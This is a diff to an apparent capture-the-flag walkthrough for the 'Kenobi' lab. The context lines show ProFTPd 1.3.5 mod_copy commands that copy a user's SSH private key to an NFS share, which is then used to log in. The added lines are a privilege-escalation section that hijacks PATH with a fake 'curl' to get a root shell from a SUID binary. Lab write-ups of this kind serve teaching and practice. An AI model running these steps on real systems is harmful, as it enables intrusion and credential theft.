@@ -27,7 +27,9 @@ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
  $ searchsploit proftpd | grep 1.3.5          
 ```
 > ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)               | linux/remote/37262.rb
+
 > ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                     | linux/remote/36803.py
+
 > ProFTPd 1.3.5 - File Copy                                               | linux/remote/36742.txt
 
 CPFR/CPTO kenobi id_rsa to /var/tmp
@@ -42,4 +44,19 @@ CPTO /var/tmp/id_rsa
 sudo mount $IP:/var /mnt/kenobinfs
 sudo chmod 600 id_rsa
 ssh -i id_rsa kenobi@$IP
+```
+
+## Escalate
+Search for SUID binaries
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Run strings on suspicious binary.
+
+```bash
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
 ```
